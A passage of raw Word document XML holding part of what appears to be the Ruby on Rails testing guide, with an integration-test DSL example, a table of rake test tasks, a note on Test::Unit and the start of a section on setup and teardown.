              </w:rPr>
              <w:t>    guest.browses_site</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="507953E1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5993C3AA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # Continue with other assertions</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14C6444D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1536F4E6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="785DD47F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  private</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42AE0E23" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A613440" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>CustomDsl</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E1E456D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>browses_site</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A5A600F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      get "/products/all"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1823E3DD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      assert_response :success</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33E9428B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      assert assigns(:products)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16AA9D40" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A5F500E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="258EFE95" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79C95744" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>login(user)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C25D44C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    open_session do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|sess|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="124E468C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      sess.extend(CustomDsl)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FF521A7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      u = users(user)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A18F7BB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      sess.https!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0AE4A8A3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      sess.post "/login", :username</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; u.username, :password</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; u.password</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="012637AE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      assert_equal '/welcome', path</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3232C61C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      sess.https!(false)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60E6E6FB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1538031D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20DC3C1D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="24E6D29A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>6 Rake Tasks for Running your Tests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="462A3696" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You don’t need to set up and run your tests by hand on a test-by-test basis. Rails comes with a number of rake tasks to help in testing. The table below lists all rake tasks that come along in the default Rakefile when you initiate a Rails project.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2"/>
        <w:gridCol w:w="6064"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="627B5748" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5C7CEDC2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">Tasks </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3FBA2071" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="4966C867" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="30D042E5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>rake test</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="40A30795" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Runs all unit, functional and integration tests. You can also simply run </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>rake</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> as the </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="a7"/>
              </w:rPr>
              <w:t>test</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> target is the default.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="41812237" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0722F921" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>rake test:benchmark</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="63BC1511" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Benchmark the performance tests</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="10AF3849" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="120A672F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>rake test:functionals</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="34252954" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Runs all the functional tests from </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>test/functional</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="42A06FB4" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2D0F07E9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>rake test:integration</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="34AF42BF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Runs all the integration tests from </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>test/integration</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="13201235" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1FEA2FD3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>rake test:profile</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7639668C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Profile the performance tests</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="75B68B8A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="50672CC8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>rake test:recent</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="212DD0F8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Tests recent changes</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="76F0805F" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="771417FA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>rake test:uncommitted</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="58E8D2EC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Runs all the tests which are uncommitted. Supports Subversion and Git</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="098457F9" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0379B826" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>rake test:units</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6F9A3230" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Runs all the unit tests from </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>test/unit</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="352F9ABD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">7 Brief Note About </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Test::Unit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E500FBC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Ruby ships with a boat load of libraries. One little gem of a library is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Test::Unit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, a framework for unit testing in Ruby. All the basic assertions discussed above are actually defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Test::Unit::Assertions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The class </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport::TestCase</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which we have been using in our unit and functional tests extends </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Test::Unit::TestCase</w:t>
      </w:r>
      <w:r>
        <w:t>, allowing us to use all of the basic assertions in our tests.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60789FA6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For more information on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Test::Unit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, refer to </w:t>
      </w:r>
      <w:hyperlink r:id="rId646" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>test/unit Documentation</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0E9182FE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>8 Setup and Teardown</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5AFC06" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you would like to run a block of code before the start of each test and another block of code after the end of each test you have two special callbacks for your rescue. Let’s take note of this by looking at an example for our functional test in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Posts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> controller:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7200"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="580C2C78" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="60836365" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'test_helper'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B890537" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4299DB8F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
